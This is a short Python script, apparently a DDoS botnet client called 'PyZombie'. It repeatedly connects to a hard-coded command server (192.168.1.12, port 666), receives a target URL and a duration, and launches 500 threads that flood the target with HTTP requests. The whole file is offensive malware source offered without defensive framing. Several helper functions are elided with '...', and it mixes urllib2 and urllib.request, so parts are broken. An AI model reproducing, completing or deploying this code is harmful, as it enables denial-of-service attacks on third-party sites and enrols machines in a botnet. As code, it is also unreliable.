import urllib2, threading, random, re, time, socket
headers_useragents=[]
headers_referes=[]

def useragent_list():
	...
def buildblock(size):
	...

def httpcall(url):
	...
	try:
		urllib.request.urlopen(request)
	except:
		pass

class HTTPThread(threading.Thread):
	def run(self):
		try:
			while time.time() < tempo_maximo:
				httpcall(url)
		except:
			pass

while True:
	try:
		sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect(('192.168.1.12', 666))
		while True:
			data= sock.recv(1024)
			url= data[:data.find('|')]
			if url.count('/') == 2:
				url= url + "/"
			m=re.search("http\://([^/]*)/?.*", url)
			host=m.group(1)
			tempo=data[data.rfind('|')+1:]
			tempo_maximo=time.time() + float(tempo)
			print("PyZombie criado")
			for i in range(500):
				t=HTTPThread()
				t.start()
	except:
		pass
